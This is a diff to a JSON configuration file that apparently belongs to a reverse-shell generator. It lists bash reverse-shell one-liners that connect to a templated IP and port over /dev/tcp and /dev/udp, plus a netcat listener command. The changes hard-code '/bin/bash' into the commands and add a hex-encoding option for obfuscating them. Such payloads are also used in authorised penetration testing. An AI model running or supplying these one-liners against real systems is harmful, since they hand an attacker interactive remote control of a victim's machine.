@@ -1,7 +1,7 @@
 [
     {
         "name": "Bash -i",
-        "command": "{shell} -i >& /dev/tcp/${values.ip}/${values.port} 0>&1",
+        "command": "/bin/bash -i >& /dev/tcp/${values.ip}/${values.port} 0>&1",
         "tags": [
             "linux",
             "mac",
@@ -10,13 +10,14 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
     },
     {
         "name": "Bash 196",
-        "command": "0<&196;exec 196<>/dev/tcp/${values.ip}/${values.port}; {shell} <&196 >&196 2>&196",
+        "command": "0<&196;exec 196<>/dev/tcp/${values.ip}/${values.port}; /bin/bash <&196 >&196 2>&196",
         "tags": [
             "linux",
             "mac",
@@ -25,6 +26,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -40,13 +42,14 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
     },
     {
         "name": "Bash 5",
-        "command": "{shell} -i 5<> /dev/tcp/${values.ip}/${values.port} 0<&5 1>&5 2>&5",
+        "command": "/bin/bash -i 5<> /dev/tcp/${values.ip}/${values.port} 0<&5 1>&5 2>&5",
         "tags": [
             "linux",
             "mac",
@@ -55,6 +58,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -62,7 +66,7 @@
     {
         "name": "Bash UDP",
         "listener_cmd": "nc -u -lvp ${values.port}",
-        "command": "{shell} -i >& /dev/udp/${values.ip}/${values.port} 0>&1",
+        "command": "/bin/bash -i >& /dev/udp/${values.ip}/${values.port} 0>&1",
         "tags": [
             "linux",
             "mac",
@@ -71,6 +75,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -86,6 +91,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -101,6 +107,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -125,6 +132,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -140,6 +148,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -156,6 +165,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -180,6 +190,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -219,6 +230,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 18.04.6"
@@ -234,6 +246,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -249,6 +262,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -265,6 +279,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 18.04.6"
@@ -333,6 +348,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -348,6 +364,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -363,6 +380,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -378,6 +396,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -407,6 +426,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -422,6 +442,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -437,6 +458,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -452,6 +474,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -467,6 +490,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -502,6 +526,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -518,6 +543,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -534,6 +560,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -577,6 +604,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -592,6 +620,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -616,6 +645,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
@@ -660,6 +690,7 @@
         "oneliner": [
             {"bash_b64": "command"},
             {"bash_hex": "command"},
+            {"bash_x_hex": "command"},
             {"bash_rot": "command"}
         ],
         "note": "Test in Ubuntu 20.04.2"
